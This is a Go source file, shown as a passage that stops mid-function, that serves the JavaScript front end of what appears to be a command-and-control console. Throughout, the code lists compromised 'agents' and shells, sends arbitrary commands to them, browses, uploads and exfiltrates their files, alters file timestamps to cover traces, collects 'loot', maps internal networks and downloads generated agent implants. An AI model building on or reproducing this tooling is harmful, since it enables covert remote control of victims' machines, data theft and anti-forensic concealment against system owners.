package web_ui
import (
	"net/http"
	"fmt"
)
func Js(error_str,web_route,web_js,web_css string, sessionSlice []string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		_, ok := CheckUserSession(r, sessionSlice, error_str)
        if !ok {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w, error_str)
            return
        }
		if r.Method == http.MethodGet {
html := `
if (!window.AgentTaskId) {
    window.AgentTaskId = Math.random().toString(36).substring(2) + Date.now();
}
if (!window.main_server) {
    window.main_server = window.location.host;
}
let server_data = [];
let User_data = [];
let check_time = [];
let check_uid = [];
let shell_list=[];
let server_plugin = [];
let chat_slice = [];
let user_slice = [];

let msgQueues = {};
let resultQueues = {};
let fileQueues = {};
let netQueues = {};

let resultTimers = window.resultTimers || {};
window.resultTimers = resultTimers;
let serverClientCounts = window.serverClientCounts || {};
window.serverClientCounts = serverClientCounts;
let onlineTeammates = window.onlineTeammates || [];
window.onlineTeammates = onlineTeammates;
window.terminalSessions = window.terminalSessions || {};
window.netInitTimer = window.netInitTimer || null;
window.netPollingTimer = window.netPollingTimer || null;
window.shellInnetData = window.shellInnetData || {};

function createRuntimeTaskId(prefix = "task") {
    return prefix + "-" + Math.random().toString(36).slice(2) + Date.now();
}

function normalizeServerCountKey(value) {
    return String(value || "").trim().toLowerCase();
}

function escapeHtml(value) {
    return String(value || "")
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function applyServerClientCountsToDom() {
    if (!Array.isArray(server_data)) {
        return;
    }
    server_data.forEach(function(server) {
        if (!server || typeof server.port === "undefined") {
            return;
        }
        const port = String(server.port);
        const count = String(serverClientCounts[port] || 0);
        const clientNode = document.getElementById(port);
        if (clientNode) {
            clientNode.textContent = count;
        }
    });
}

function rebuildServerClientCounts(agentList) {
    const countsByRemark = {};
    const nextCounts = {};
    const list = Array.isArray(agentList) ? agentList : [];

    list.forEach(function(agent) {
        if (!agent) {
            return;
        }
        const key = normalizeServerCountKey(agent.server || agent.Server);
        if (!key) {
            return;
        }
        countsByRemark[key] = (countsByRemark[key] || 0) + 1;
    });

    if (Array.isArray(server_data)) {
        server_data.forEach(function(server) {
            if (!server || typeof server.port === "undefined") {
                return;
            }
            const port = String(server.port);
            const remarkKey = normalizeServerCountKey(
                server.remark || server.Remark || server.server || server.Server
            );
            nextCounts[port] = countsByRemark[remarkKey] || 0;
        });
    }

    Object.keys(serverClientCounts).forEach(function(port) {
        delete serverClientCounts[port];
    });
    Object.assign(serverClientCounts, nextCounts);
    applyServerClientCountsToDom();
}

function applyNetData(uid, list) {
    if (!uid) {
        return;
    }
    const safeList = Array.isArray(list) ? list : [];
    netQueues[uid] = safeList;

    window.shellInnetData = window.shellInnetData || {};
    window.shellInnetData[uid] = safeList.flatMap(function(item) {
        if (item && Array.isArray(item.shell_innet)) {
            return item.shell_innet;
        }
        return [];
    }).filter(Boolean);

    const shellSelect = document.getElementById("net_shell");
    if (shellSelect && shellSelect.value === uid) {
        let net = new lain_net();
        net.getshellip(window.shellInnetData[uid], uid);
        net.renderNetList(safeList, uid);
    }
}


function getCookie(name) {
    let cookies = document.cookie.split('; ');
    for (let i = 0; i < cookies.length; i++) {
        let cookie = cookies[i];
        let cookieParts = cookie.split('=');
        if (cookieParts[0] === name) {
            return cookieParts[2];
        }
    }
    return null;
}
const Username = getCookie("cookie");

class WebSocketClient {
    constructor(url){
        this.url = url;
        this.ws = null;
        this.currentDownload = null;
        this.connectPromise = null;
    }
    connect(){
        if(this.ws &&this.ws.readyState === WebSocket.OPEN){
            return Promise.resolve(true);
        }
        if(this.connectPromise){
            return this.connectPromise;
        }
        console.log("connect:",this.url);
        this.connectPromise = new Promise((resolve, reject)=>{
            this.ws = new WebSocket(this.url);
            this.ws.binaryType = "arraybuffer";
            this.ws.onopen = ()=>{
                console.log("websocket connected");
                this.connectPromise = null;
                resolve(true);
            };
            this.ws.onmessage = (event)=>{
                if(typeof event.data !== "string"){
                    this.handleBinaryMessage(event.data);
                    return;
                }
                let msg;
                try{
                    msg = JSON.parse(event.data);
                }catch(e){
                    console.error("json parse error:",event.data);
                    return;
                }
                if(this.handleDownloadMessage(msg)){
                    return;
                }
                this.handleMessage(msg);
            };
            this.ws.onerror=(err)=>{
                console.error("websocket error:",err);
            };
            this.ws.onclose=()=>{
                console.log("websocket closed");
                this.ws=null;
                if(this.connectPromise){
                    reject(new Error("websocket closed before open"));
                    this.connectPromise = null;
                }
            };
        });
        return this.connectPromise;
    }
    async ensureConnected(timeout = 5000){
        if(this.ws && this.ws.readyState === WebSocket.OPEN){
            return true;
        }
        const connectPromise = this.connect();
        if(!connectPromise){
            return false;
        }
        const timeoutPromise = new Promise((_, reject)=>{
            setTimeout(()=>{
                reject(new Error("websocket connect timeout"));
            }, timeout);
        });
        await Promise.race([connectPromise, timeoutPromise]);
        return this.ws && this.ws.readyState === WebSocket.OPEN;
    }
    async send(path,body={}){
        if(!this.ws ||this.ws.readyState !== WebSocket.OPEN){
            try{
                await this.ensureConnected();
            }catch(e){
                console.error("websocket not connected", e);
                return false;
            }
        }
        if(!this.ws ||this.ws.readyState !== WebSocket.OPEN){
            console.error("websocket not connected");
            return false;
        }
        const data={
            path:path,
            body:body
        };
        try{
            this.ws.send(
                JSON.stringify(data)
            );
            console.log("send:",data);
            return true;
        }catch(e){
            console.error("send error:",e);
            return false;
        }
    }
    async sendBinary(data){
        if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
            console.error("websocket not connected");
            return false;
        }
        try{
            this.ws.send(data);
            return true;
        }catch(e){
            console.error("binary send error:",e);
            return false;
        }
    }
    handleBinaryMessage(data){
        if(!this.currentDownload){
            return;
        }
        this.currentDownload.chunks.push(data);
        this.currentDownload.received += data.byteLength || 0;
    }
    handleDownloadMessage(msg){
        if(!this.currentDownload){
            return false;
        }
        if(msg.path !== this.currentDownload.path){
            return false;
        }
        if(msg.code && msg.code !== 200){
            this.rejectDownload(new Error(msg.message || "download failed"));
            return true;
        }
        const isStart = msg.type === "file_start" ||
            (msg.filename && typeof msg.size !== "undefined");
        if(isStart){
            this.currentDownload.filename = msg.filename || this.currentDownload.filename;
            this.currentDownload.size = msg.size || 0;
            this.currentDownload.started = true;
            return true;
        }
        const isEnd = msg.type === "file_end" ||
            msg.message === "download finished";
        if(isEnd){
            this.finishDownload();
            return true;
        }
        return false;
    }
    rejectDownload(error){
        if(!this.currentDownload){
            return;
        }
        const pending = this.currentDownload;
        if(pending.timer){
            clearTimeout(pending.timer);
        }
        this.currentDownload = null;
        pending.reject(error);
    }
    finishDownload(){
        if(!this.currentDownload){
            return;
        }
        const pending = this.currentDownload;
        if(pending.timer){
            clearTimeout(pending.timer);
        }
        const blob = new Blob(
            pending.chunks,
            { type: "application/octet-stream" }
        );
        const url = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.href = url;
        link.download = pending.filename || "download.bin";
        document.body.appendChild(link);
        link.click();
        link.remove();
        setTimeout(()=>{
            URL.revokeObjectURL(url);
        }, 1000);
        this.currentDownload = null;
        pending.resolve({
            filename: pending.filename,
            size: pending.received,
        });
    }
    async downloadFile(path, body = {}, timeout = 30000){
        if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
            throw new Error("websocket not connected");
        }
        if(this.currentDownload){
            throw new Error("another download is in progress");
        }
        const downloadPromise = new Promise((resolve, reject)=>{
            this.currentDownload = {
                path: path,
                chunks: [],
                filename: null,
                size: 0,
                received: 0,
                started: false,
                resolve: resolve,
                reject: reject,
                timer: setTimeout(()=>{
                    this.rejectDownload(new Error("download timeout"));
                }, timeout),
            };
        });
        const sent = await this.send(path, body);
        if(!sent){
            this.rejectDownload(new Error("send download request failed"));
        }
        return downloadPromise;
    }
    async downloadLog(){
        return this.downloadFile("downloadlog");
    }
    waitForMessage(matcher, timeout = 15000){
        return new Promise((resolve, reject)=>{
            if(!this.ws){
                reject(new Error("websocket not connected"));
                return;
            }
            let timer = null;
            const listener = (event)=>{
                let msg;
                try{
                    msg = JSON.parse(event.data);
                }catch(e){
                    return;
                }
                if(!matcher(msg)){
                    return;
                }
                cleanup();
                resolve(msg);
            };
            const cleanup = ()=>{
                if(timer){
                    clearTimeout(timer);
                }
                if(this.ws){
                    this.ws.removeEventListener("message", listener);
                }
            };
            timer = setTimeout(()=>{
                cleanup();
                reject(new Error("wait message timeout"));
            }, timeout);
            this.ws.addEventListener("message", listener);
        });
    }
    async sendFile(path, body, file, chunkSize, onProgress){
        if(!this.ws || this.ws.readyState !== WebSocket.OPEN){
            console.error("websocket not connected");
            throw new Error("websocket not connected");
        }
        const readyPromise = this.waitForMessage((msg)=>{
            return msg.path === path && (msg.type === "ready" || msg.code >= 400);
        });
        const requestSent = await this.send(path, body);
        if(!requestSent){
            throw new Error("send request failed");
        }
        const readyMsg = await readyPromise;
        if(readyMsg.code && readyMsg.code !== 200){
            throw new Error(readyMsg.message || "server not ready");
        }
        await this.uploadBinary(file, chunkSize, onProgress);
        const resultPromise = this.waitForMessage((msg)=>{
            return msg.path === path && msg.type !== "ready";
        });
        const endSent = await this.send(
            "upload_end",
            {
                type:"upload_end"
            }
        );
        if(!endSent){
            throw new Error("send upload_end failed");
        }
        const resultMsg = await resultPromise;
        if(resultMsg.code && resultMsg.code !== 200){
            throw new Error(resultMsg.message || "upload failed");
        }
        return resultMsg;
    }
    async uploadChatFile(file, path){
        return this.sendFile(
            path,
            {
                filename:file.name
            },
            file,
            64 * 1024
        );
    }
    async uploadBinary(file, chunkSize = 64 * 1024, onProgress = null){
        let offset = 0;
        while(offset < file.size){
            let chunk = file.slice(
                offset,
                offset + chunkSize
            );
            let buffer = await chunk.arrayBuffer();
            const sent = await this.sendBinary(buffer);
            if(!sent){
                throw new Error("binary send failed");
            }
            offset += chunkSize;
            if(onProgress){
                onProgress(offset, file.size);
            }
            console.log("upload:",offset,"/",file.size);
        }
    }
    close(){
        if(this.ws){
            this.ws.close();
            this.ws=null;
        }
    }
    handleMessage(msg) {
        console.log(
            "PATH:",msg.path,
            "received:", msg
        );
        switch(msg.path) {
            case "getResults":
                if (msg.data && String(msg.data).trim()) {
                    const shell = (window.terminalSessions && window.terminalSessions[msg.uid]) ||
                        window.activeTerminal;
                    if (shell) {
                        shell.handleResult(msg);
                    }
                    console.log("getResults:", msg.data);
                }
                break;
            case "log":
                this.handleLog(msg);
                break;
            case "listen":
                this.handleListen(msg);
                break;
            case "agentList":
                this.handleAgentList(msg);
                break;
            case "winAgentList":
                break;
            case "chat":
                chat_slice = msg.data;
                this.handleChat(msg);
                break;
            case "loot":
                if(msg.data){
                    let lootIndex = new lain_index();
                    lootIndex.loothander(msg.data);
                }
                break;
            case "server":
                this.handleServer(msg);
                break;
            case "PluginList":
                this.handlePlugin(msg);
                break;
            case "CheckTime":
                this.handleCheck(msg);
                break;
            case "checkAgent":
                this.handleCheckAgent(msg);
                break;
            case "onlineteamment":
                if (msg.code === 200 || msg.data) {
                    this.handleOnlineTeammates(msg);
                }
                break;
            case "getShellInnet":
                if (msg.code === 200) {
                    if (msg.uid) {
                        window.shellInnetData[msg.uid] = msg.data;
                    }
                    const selectedUid = document.getElementById("net_shell") ?
                        document.getElementById("net_shell").value :
                        "";
                    if (selectedUid && (!msg.uid || selectedUid === msg.uid)) {
                        let netInstance = new lain_net();
                        netInstance.getshellip(msg.data, selectedUid);
                    }
                }
                break;
            case "insertKey":
                if(msg.code === 200){
                    console.log("Key inserted successfully");
                } else {
                    console.log("Failed to insert key: " + msg.message);
                }
                break
            case "insertPlugin":
                if(msg.code === 200){
                    customLog(msg.message || "Plugin inserted successfully");
                } else {
                    customAlert(msg.message || "Insert plugin failed");
                }
                break;
            case "delPlugin":
                if(msg.code === 200){
                    customLog(msg.message || "Plugin deleted successfully");
                } else {
                    customAlert(msg.message || "Delete plugin failed");
                }
                break;
            case "agentcode":
                if(msg.code===200){
                    let blob=new Blob(
                        [msg.data],
                        {
                            type:"text/plain"
                        }
                    );
                    let a=document.createElement("a");
                    a.href=URL.createObjectURL(blob);
                    a.download="agent.go";
                    a.click();
                }
                break;
            case "sendChat":
                if (msg.code===200){
                    document.getElementById("chat_input").value="";
                }
                break;
            case "deleteChat":
                if(msg.code===200){
                    customLog("Deleted successfully");
                }
                break;
            case "GetMsgList":
                if (msg.data) {
                    let uid = msg.data.uid;
                    msgQueues[uid] = Array.isArray(msg.data.data) ?
                        msg.data.data :
                        [];
                }
                break;
            case "GetMsgPost":
                if (msg.data) {
                    let uid = msg.data.uid;
                    resultQueues[uid] = Array.isArray(msg.data.data) ?
                        msg.data.data :
                        [];
                }
                break;
            case "GetMsgCache":
                if (msg.data) {
                    let uid = msg.data.uid;
                    fileQueues[uid] = Array.isArray(msg.data.data) ?
                        msg.data.data :
                        [];
                    if (window.activeFileManager &&
                        window.activeFileManager.uid === uid) {
                        window.activeFileManager.history_file(uid);
                    }
                }
                break;
            case "GetMsgNet":
                if (msg.data) {
                    const uid = msg.data.uid;
                    const list = Array.isArray(msg.data.data) ? msg.data.data : [];
                    applyNetData(uid, list);
                }
                break;
            case "getNetdata":
                if (msg.code === 200) {
                    const shellSelect = document.getElementById("net_shell");
                    const uid = shellSelect ? shellSelect.value : "";
                    const list = Array.isArray(msg.data) ? msg.data : [];
                    applyNetData(uid, list);
                }
                break;
            default:
                console.log("not handled:", msg.path);
                break;
        }
    }
    handleLog(msg) {
        if(!msg.data || !msg.data.length){
            return;
        }
        let logDiv = document.getElementById("log-content");
        if(!logDiv){
            console.error("Log content div not found.");
            return;
        }
        let html = "";
        for(let i = 0; i < msg.data.length; i++) {
            html += "[" + msg.data[i].time + "] : "+ msg.data[i].message + "<br>";
        }        
        logDiv.innerHTML = html;
    }
    handleChat(msg){
        let indexchat = new lain_chat();
        let chat_div = document.getElementById("chat_div");
        chat_div.innerHTML = "";
        if (!msg || !Array.isArray(msg.data)) {
            console.error("Invalid chat data");
            return;
        }
        for (let i = 0; i < msg.data.length; i++) {
            indexchat.renderChatItem(msg.data[i]);
        }
    }
    handleListen(msg) {
        let indexInstance = new index();
        indexInstance.renderClients(msg.data);
    }
    handleAgentList(msg) {
        let indexInstance = new lain_index();
        User_data = (msg.data && msg.data.length) ?
            (Array.isArray(msg.data) ? msg.data : []) :
            [];
        shell_list = User_data.slice();
        window.shell_list = shell_list;

        if(User_data.length > 0) {
            window.shell_list = shell_list;
            indexInstance.renderUserList(User_data);
            net_init();
            rebuildServerClientCounts(User_data);
        } else {
            shell_list = [];
            window.shell_list = shell_list;
            indexInstance.renderUserList([]);
            net_init();
            rebuildServerClientCounts([]);
        }
    }
    handleServer(msg){
        let indexServer = new lain_server();
        server_data = msg.data;
        indexServer.updateServerIndex();
        indexServer.initServerIndexClickHandler();
        rebuildServerClientCounts(User_data);
        indexServer.requestOnlineTeammates();
    }
    handlePlugin(msg){
        server_plugin = Array.isArray(msg.data) ? msg.data : [];
        let serverUi = new lain_server();
        serverUi.refreshPluginList();
    }
    handleCheck(msg){
        check_time = msg.data;
        let indexCheck = new lain_index();
        indexCheck.checkTime();

    }
    handleCheckAgent(msg){
        let indexCheckAgent = new lain_server();
        indexCheckAgent.checkAgent(User_data);
    }
    handleOnlineTeammates(msg){
        onlineTeammates = Array.isArray(msg.data) ? msg.data : [];
        window.onlineTeammates = onlineTeammates;
        let serverUi = new lain_server();
        serverUi.renderOnlineTeammatesCard();
    }
}

const webSocketClient = new WebSocketClient(
    "wss://" + main_server + "/"+"`+web_route+`"
);

webSocketClient.connect();

class index{
    renderClients(clients){
        if (typeof clients === "string") {
            try {
                clients = JSON.parse(clients);
            } catch (e) {
                console.error("Invalid JSON data", e);
                return;
            }
        }
        var div = document.getElementById('div_conn');
        // 先清空当前显示
        while(div.firstChild){
            div.removeChild(div.firstChild);
        }
        // 空数组直接显示为空
        if (!clients || !Array.isArray(clients)) {
            console.error("Invalid clients data");
            return;
        }
        if (clients.length === 0) {
            shell_list = [];
            net_init();
            return;
        }
        shell_list = Array.isArray(clients) ? clients.slice() : [];
        window.shell_list = shell_list;
        net_init();
        for(let i = 0; i < clients.length; i++){
            let c = clients[i];
        
            var container = document.createElement('div');
            container.className = 'client-card';
        
            var pUid = document.createElement('p');
			pUid.innerHTML = '<span>Uid</span>' + c.uid;

			var pHost = document.createElement('p');
			pHost.innerHTML = '<span>Host</span>' + c.host;

			var pTime = document.createElement('p');
			pTime.innerHTML = '<span>Online</span>' + c.online_time;

			var pIP = document.createElement('p');
			pIP.innerHTML = '<span>IP</span>' + c.shell_ip;
        
            var btnReceive = document.createElement('button');
            btnReceive.textContent = "Receive";
            btnReceive.className = "btn receive";
            btnReceive.onclick = () => {
                get_conn(c.uid, c.host);
            };
        
            var btnRemove = document.createElement('button');
            btnRemove.textContent = "Remove";
            btnRemove.className = "btn remove";
            btnRemove.onclick = () => {
                del_conn(c.uid);
            };
        
        
            var btnBox = document.createElement('div');
            btnBox.className = "btn-box";
        
            btnBox.appendChild(btnReceive);
            btnBox.appendChild(btnRemove);
        
        
            container.appendChild(pUid);
            container.appendChild(pHost);
            container.appendChild(pTime);
            container.appendChild(pIP);
            container.appendChild(btnBox);
        
            div.appendChild(container);
        }
    }
        async get(uid,shellname){
            const confirm1 = await customConfirm("confirm?");
            if(!confirm1){
                return false;
            }
            const sent = await webSocketClient.send(
                "insertKey",
                {
                    uid:uid,
                    username:Username,
                    request:shellname
                }
            );
            return sent ? uid : false;
        }
        async del(uid, info = ""){
            const confirmed = await customConfirm("confirm?");
            if(!confirmed){
                return;
            }
            const result = await webSocketClient.send(
                "delIndex",
                {
                    uid: uid,
                    info: info || ""
                }
            );
            if(!result){
                customLog("Delete agent failed");
                return;
            }
            document
            .getElementById("container-"+uid)
            ?.remove();
            customLog("Agent removed");
        }
    }
      
      class lain_terminal{
        constructor() {
            this.uid = "";
            this.isMovingFile = false;
            this.move_file = this.move_file.bind(this);
            this.look_file = this.look_file.bind(this);
            this.intervalId = null;
            this.currentInput="";
            this.inputContainer="";
            this.terminalEl = null;
            this.dialogEl = null;
            this.currentTaskId = "";
            this.inputKeydown = this.inputKeydown.bind(this);
        }
        lain_time(uid, taskid, command) {
            if (!uid) {
                console.log("uid is empty");
                return false;
            }
            try {
                let key = uid + "*" + taskid;
                // 防止重复启动
                if(resultTimers[key]){
                    console.log("已经在获取");
                    return false;
                }
                resultTimers[key] = setInterval(()=>{
                    webSocketClient.send(
                        "getResults",
                        {
                            uid: uid,
                            Taskid: taskid
                        },
                        taskid
                    );
                },2000);
                this.appendOutput("sending msg >>" + command);
                return true;
            } catch(err) {
                console.error("Error:",err);
                return false;
            }
        }
        appendOutput(text, className = "output") {
            const terminalEl = this.terminalEl ||
                (this.dialogEl ? this.dialogEl.querySelector(".terminal") : document.querySelector(".terminal"));
            const inputContainer = this.inputContainer || (terminalEl ? terminalEl.querySelector(".input-container") : null);
            if (!terminalEl || !inputContainer) {
                return null;
            }
            const output = document.createElement("div");
            output.contentEditable = true;
            output.textContent = text;
            output.className = className;
            inputContainer.appendChild(output);
            terminalEl.scrollTop = terminalEl.scrollHeight;
            return output;
        }
        stopGetResults(uid,taskid){
            let key = uid+"*"+taskid;
            if(resultTimers[key]){
                clearInterval(resultTimers[key]);
                delete resultTimers[key];
                console.log("stop result",taskid);
            }
        }
        stopAllResultsForUid(uid){
            if(!uid){
                return;
            }
            const prefix = uid + "*";
            Object.keys(resultTimers).forEach((key) => {
                if (key.indexOf(prefix) !== 0) {
                    return;
                }
                clearInterval(resultTimers[key]);
                delete resultTimers[key];
            });
            console.log("stop all results", uid);
        }
        handleResult(msg) {
            const taskid = msg.taskid || this.currentTaskId || AgentTaskId;
            this.stopGetResults(msg.uid, taskid);
            this.appendOutput(msg.data);
            if (this.currentInput) {
                this.currentInput.focus();
            }
        }
        async get(command){
            if(!this.uid){
                return;
            }
            this.sendjob('agent'); // 创建新的提示符
            try {
                const taskid = createRuntimeTaskId("terminal");
                let result = await webSocketClient.send(
                    
                    "msg",
                    {
                        uid:this.uid,
                        msg:command,
                        Taskid:taskid
                    }
                );
                if(result){
                    this.currentTaskId = taskid;
                    if (this.currentInput) {
                        this.currentInput.disabled = true;
                        this.currentInput.readOnly = true;
                        this.currentInput.classList.add("shell-input-history");
                    }
                    this.createInput();
                    const started = this.lain_time(this.uid, taskid, command);
                    if (!started) {
                        this.appendOutput("task polling not started");
                    }
                }
            } catch(err){
                console.error(err);
                if (this.currentInput) {
                    this.currentInput.disabled = false;
                }
                this.createInput();
            }
        }
        async sendjob(str){
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = str+' SendMsg--->>';
            const terminal = this.terminalEl ||
                (this.dialogEl ? this.dialogEl.querySelector(".terminal") : null);
            const inputContainer = this.inputContainer ||
                (terminal ? terminal.querySelector(".input-container") : null);
            if (!terminal || !inputContainer) {
                return;
            }
            inputContainer.appendChild(newPrompt);
            terminal.scrollTop = terminal.scrollHeight;
        }
        createInput() {
            if (
                this.currentInput &&
                !this.currentInput.disabled &&
                this.currentInput.isConnected
            ) {
                this.currentInput.focus();
                return;
            }
            const newPrompt = document.createElement('div');
            newPrompt.className = 'output';
            newPrompt.textContent = 'Command>';
            const newInput = document.createElement('input');
            newInput.type = 'text';
            newInput.className = 'shell-input';
            newInput.addEventListener('keydown', this.inputKeydown);
            this.inputContainer.appendChild(newPrompt);
            this.inputContainer.appendChild(newInput);
            newInput.focus();
            this.currentInput = newInput;
        }
        async inputKeydown(event) {
            if (event.key === 'Enter') {
                event.preventDefault();
                const command = this.currentInput.value.trim();
                if (command) {
                    await this.get(command);
                    // 不需要再 await lain_time 和 createInput，这些已在 get 里处理
                }
            }
        }
        async loadFile(file_name, fileSize){
            if(!fileSize || !file_name){
                return false;
            }
            let splitSizeInput = document.getElementById('splitSize');
            let splitSize = splitSizeInput.value
                ? parseFloat(splitSizeInput.value) * 1024 * 1024
                : 0;
            let file_key = this.uid + "**///**" + file_name + "**///**" + splitSize;
            let powershell = "LOAD_U_FILE*//*" + file_key;
            webSocketClient.send(
                
                "msg",
                {
                    uid:this.uid,
                    msg:powershell,
                    Taskid:AgentTaskId
                }
            );
            return true;
        }
        async getFile(path){
            if(!path){
                return;
            }
            let splitSizeInput = document.getElementById('splitSize');
            let splitSize = splitSizeInput.value
                ? parseFloat(splitSizeInput.value) * 1024 * 1024
                : 0;
            let powershell = "GET_U_FILE*//*" + path + "*//*" + splitSize;
            webSocketClient.send(
                
                "msg",
                {
                    uid:this.uid,
                    msg:powershell,
                    Taskid:AgentTaskId
                }
            );
        }
        renderFileList(fileContent, shell_dir) {
		    const div_file = document.getElementById('file_resp');
		    div_file.innerHTML = '';
		    const dir_list = fileContent.split("\n");
		
		    for (let i = 0; i < dir_list.length; i++) {
		        let file = dir_list[i].trim();
		        if (!file) continue;
		
		        let new_file = document.createElement('div');
		        new_file.classList.add('directory');
		
		        let isDir = file.startsWith("dir ");
		        let isFil = file.startsWith("fil ");
		        let type = isDir ? "dir" : (isFil ? "fil" : null);
		        if (!type) continue;
		
		        let match = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)>$/);
		        let matchFile = file.match(/^(\w+)\s+(.+?)<([^<>]+)><([^<>]+)><([^<>]+)>$/);
		
		        let name = "", size = "", perm = "", mtime = "";
		        if (matchFile && type === "fil") {
		            name = matchFile[2];
		            size = matchFile[3];
		            perm = matchFile[4];
		            mtime = matchFile[5];
		        } else if (match && type === "dir") {
		            name = match[2];
		            perm = match[3];
		            mtime = match[4];
		        } else {
		            continue;
		        }
		
		        let full_path = shell_dir ? (shell_dir + "/" + name) : name;
		        new_file.dataset.path = full_path; 
		
		        let renameBtn = "<button class='rename-btn' style='margin-left:5px;'>✏️</button>";
		        let timeBtn   = "<button class='time-btn' style='margin-left:5px;'>⏰</button>";
		
		        if (type === "dir") {
		            new_file.classList.add('dir');
		            new_file.innerHTML =
		                '<span class="icon-dir">📁</span>' +
		                '<span class="filename">' + name + '</span>' +
		                '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
		                '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
		                renameBtn + timeBtn;
		
		            new_file.onclick = () => {
		                this.move_file(0, name);
		            };
		        } else {
		            new_file.classList.add('file');
		            new_file.innerHTML =
		                '<span class="icon-file">📄</span>' +
		                '<span class="filename">' + name + '</span>' +
		                '<span class="filesize">&lt;' + size + '&gt;</span>' +
		                '<span class="fileperm">&lt;' + perm + '&gt;</span>' +
		                '<span class="filetime">&lt;' + mtime + '&gt;</span>' +
		                '<span class="icon-download" style="cursor:pointer;">⬇️</span>' +
		                renameBtn + timeBtn;
		            new_file.addEventListener('click', () => {
		                this.getFile(new_file.dataset.path);
		            });
		            new_file.querySelector('.icon-download')?.addEventListener('click', (e) => {
		                e.stopPropagation();
		                this.getFile(new_file.dataset.path);
		            });
		        }
		
		        // === 重命名 ===
		        new_file.querySelector('.rename-btn')?.addEventListener('click', (e) => {
		            e.stopPropagation();
		            const filenameSpan = new_file.querySelector('.filename');
		            const oldName = filenameSpan.innerText;
		            const oldPath = new_file.dataset.path;
		
		            const newName = prompt("Enter the new name:", oldName);
		            if (!newName || newName === oldName) return;
		
		            const lastSlash = oldPath.lastIndexOf('/');
		            const dirPath = lastSlash >= 0 ? oldPath.substring(0, lastSlash) : '';
		            const newPath = dirPath ? (dirPath + '/' + newName) : newName;
                    const cmd = "CHANG_FILE_NAME*//*" + oldPath + "*//*" + newName;
                    webSocketClient.send(
                        
                        "msg",
                        {
                            uid:this.uid,
                            msg:cmd,
                            Taskid:AgentTaskId
                        }
                    );
		            filenameSpan.innerText = newName;
		            new_file.dataset.path = newPath; // ⭐ 状态同步
		        });
		
		        // === 修改时间 ===
		        new_file.querySelector('.time-btn')?.addEventListener('click', (e) => {
		            e.stopPropagation();
		
		            const currentPath = new_file.dataset.path;
		            const newTime = prompt("Enter the new modified time (format: YYYY-MM-DD HH:mm:ss):");
		            if (!newTime) return;
		
		            const cmd = "CHANG_FILE_TIME*//*" + currentPath + "*//*" + newTime;
                    webSocketClient.send(
                        
                        "msg",
                        {
                            uid:this.uid,
                            msg:cmd,
                            Taskid:AgentTaskId
                        }
                    );
		
		            new_file.querySelector('.filetime').innerText = "<" + newTime + ">";
		        });
		
		        div_file.appendChild(new_file);
		    }
		}
        async history_file(uid) {
            uid = uid || this.uid;
            const historyParent = document.getElementById('history');
            const historyData = Array.isArray(fileQueues[uid]) ? fileQueues[uid] : [];
            if(historyParent){
                historyParent.innerHTML='';
                if(historyData.length > 0){
                    historyData.forEach((item)=>{
                        let listDiv=document.createElement('div');
                        listDiv.classList.add('history-item');
                        const labelSpan = document.createElement('span');
                        labelSpan.className = 'history-item-label';
                        labelSpan.textContent = item.list || '';
                        listDiv.onclick=()=>{
                            if(item.file){
                                this.shell_dir=item.list;
                                this.renderFileList(
                                    item.file,
                                    item.list
                                );
                            }
                        };
                        let delBtn=document.createElement('button');
                        delBtn.type = 'button';
                        delBtn.className = 'history-delete-btn';
                        delBtn.textContent='🗑';
                        delBtn.title='delete';
                        delBtn.onclick=async(e)=>{
                            e.stopPropagation();
                            const index = Array.from(historyParent.children).indexOf(listDiv);
                            const res = await webSocketClient.send(
                                
                                "delFileList",
                                {
                                    uid:uid,
                                    index:String(index)
                                }
                            );
                            if(res.code===200){
                                if (Array.isArray(fileQueues[uid])) {
                                    fileQueues[uid].splice(index, 1);
                                }
                                listDiv.remove();
                                customLog("History deleted");
                            }else{
                                console.log(
                                    "delete failed:",
                                    res.message
                                );
                            }
                        };
                        listDiv.appendChild(labelSpan);
                        listDiv.appendChild(delBtn);
                        historyParent.appendChild(listDiv);
                    });
                }
            }
        }
        async look_file(dir) {
            dir = dir || this.shell_dir || "./";
            if(!this.uid || !dir){
                return false;
            }
            const powershell = "LOOK_UP_FILE*//*" + dir;
            try {
                const sent = await webSocketClient.send(
                    "msg",
                    {
                        uid:this.uid,
                        msg:powershell,
                        Taskid:AgentTaskId
                    }
                );
                if(!sent){
                    return false;
                }
                const deadline = Date.now() + 15000;
                while(Date.now() < deadline){
                    const responsePromise = webSocketClient.waitForMessage(
                        (msg)=>{
                            return msg.path === "getFileList" &&
                                msg.code === 200 &&
                                msg.uid === this.uid &&
                                msg.taskid === AgentTaskId;
                        },
                        1200
                    );
                    const listSent = await webSocketClient.send(
                        "getFileList",
                        {
                            uid:this.uid,
                            Taskid:AgentTaskId
                        }
                    );
                    if(!listSent){
                        return false;
                    }
                    try{
                        const result = await responsePromise;
                        if(result && result.data){
                            this.shell_dir = dir;
                            this.renderFileList(
                                result.data,
                                this.shell_dir
                            );
                            this.history_file(this.uid);
                            return true;
                        }
                    }catch(waitErr){
                    }
                    await new Promise((resolve)=>{
                        setTimeout(resolve, 500);
                    });
                }
                return false;
            } catch(err) {
                console.error(err);
                return false;
            }
        }
         async move_file(num, cur_dir) {
            let cur_dir_p = document.getElementById("cur_dir_p");
            if (this.isMovingFile) {
                console.log("Don't move around....");
                return;
            }
            this.isMovingFile = true; // 锁定操作
            let temp_dir = this.shell_dir; // 保存当前路径
            try {
                if (this.uid) {
                    if (num === 1 && cur_dir === 'no') {
                        this.shell_dir += '/..'; // 返回上级目录
                    } else if (num === 0) {
                        // 解析目录路径
                        this.shell_dir += "/" + cur_dir ;
                    }
                    // 确保 look_file 异步执行
                    let flag = await this.look_file(this.shell_dir);
                    if (!flag) {
                        this.shell_dir = temp_dir; // 回退路径
                        customLog("!Does not exist or has no permission to access this directory?");
                    }
                    console.log(this.shell_dir);
                }
            } catch (error) {
                console.error("An error occurred in move_file:", error);
            } finally {
                // 保证最终解锁
